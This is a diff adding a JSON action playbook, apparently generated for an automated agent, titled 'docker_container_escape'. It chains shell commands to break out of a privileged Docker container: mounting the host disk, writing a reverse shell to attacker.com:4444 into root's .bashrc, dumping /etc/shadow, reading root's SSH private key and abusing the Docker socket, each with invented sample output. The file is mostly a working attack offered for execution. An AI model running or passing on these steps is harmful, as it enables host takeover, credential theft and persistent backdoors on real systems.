@@ -1,0 +1,34 @@
+{
+  "name": "docker_container_escape",
+  "description": "Escape from Docker containers and gain host system root access",
+  "pattern": "docker.*escape|container.*breakout|docker.*privileged|lxc.*escape",
+  "parameters": [],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat /proc/1/cgroup | grep -i docker && ls -la /.dockerenv 2>/dev/null"]},
+      "expected_output": {"type": "string", "example": "12:perf_event:/docker/a1b2c3d4e5f6\n11:devices:/docker/a1b2c3d4e5f6\n10:cpuset:/docker/a1b2c3d4e5f6\n\n-rwxr-xr-x 1 root root 0 Jan 15 10:30 /.dockerenv\n\nConfirmed: Running inside Docker container\nContainer ID: a1b2c3d4e5f6"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "capsh --print | grep Current && fdisk -l 2>/dev/null | head -10"]},
+      "expected_output": {"type": "string", "example": "Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap+eip\n\nDisk /dev/sda: 50 GiB, 53687091200 bytes, 104857600 sectors\nDisk /dev/sdb: 100 GiB, 107374182400 bytes, 209715200 sectors\n\nPRIVILEGED CONTAINER DETECTED!\n  - Has cap_sys_admin capability\n  - Can see host block devices\n  - Can mount host filesystems"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "mkdir /tmp/host && mount /dev/sda1 /tmp/host && ls -la /tmp/host"]},
+      "expected_output": {"type": "string", "example": "Creating mount point: /tmp/host\nMounting host root filesystem /dev/sda1\n\ntotal 96\ndrwxr-xr-x  24 root root  4096 Jan 15 09:00 .\ndrwxr-xr-x   3 root root  4096 Jan 15 10:45 ..\ndrwxr-xr-x   2 root root  4096 Jan 10 15:30 bin\ndrwxr-xr-x   3 root root  4096 Jan 10 15:30 boot\ndrwxr-xr-x   4 root root  4096 Jan 15 09:00 etc\ndrwxr-xr-x   3 root root  4096 Jan 10 15:30 home\ndrwxr-xr-x  10 root root  4096 Jan 10 15:30 root\n\nHost filesystem mounted successfully!"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /tmp/host/root/.bashrc && cat /tmp/host/etc/shadow"]},
+      "expected_output": {"type": "string", "example": "Injecting backdoor into host root's .bashrc\n\nReading host /etc/shadow:\nroot:$6$xyz123abc...:18965:0:99999:7:::\nadmin:$6$def456ghi...:18965:0:99999:7:::\nuser:$6$jkl789mno...:18965:0:99999:7:::\n\nHost system compromised:\n  - Backdoored root's .bashrc\n  - Extracted password hashes\n  - Full host filesystem access"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "chroot /tmp/host /bin/bash"]},
+      "expected_output": {"type": "string", "example": "Executing chroot to host filesystem\n\nroot@host:/# id\nuid=0(root) gid=0(root) groups=0(root)\n\nroot@host:/# hostname\nhost-server\n\nroot@host:/# ps aux | grep dockerd\nroot      1234  0.5  2.1 1234567 345678 ?  Ssl  09:00   0:15 /usr/bin/dockerd\n\nroot@host:/# cat /root/.ssh/id_rsa\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\n\nComplete container escape - now root on host system"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "ls -la /var/run/docker.sock && docker -H unix:///var/run/docker.sock run -v /:/hostfs -it alpine chroot /hostfs sh"]},
+      "expected_output": {"type": "string", "example": "srw-rw---- 1 root docker 0 Jan 15 09:00 /var/run/docker.sock\n\nDocker socket accessible from container!\n\nSpawning new privileged container with host filesystem mounted:\ndocker run -v /:/hostfs -it alpine chroot /hostfs sh\n\n# id\nuid=0(root) gid=0(root) groups=0(root)\n\n# hostname\nhost-server\n\n# cat /etc/hostname\nhost-server\n\nEscaped via Docker socket abuse - full host access"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
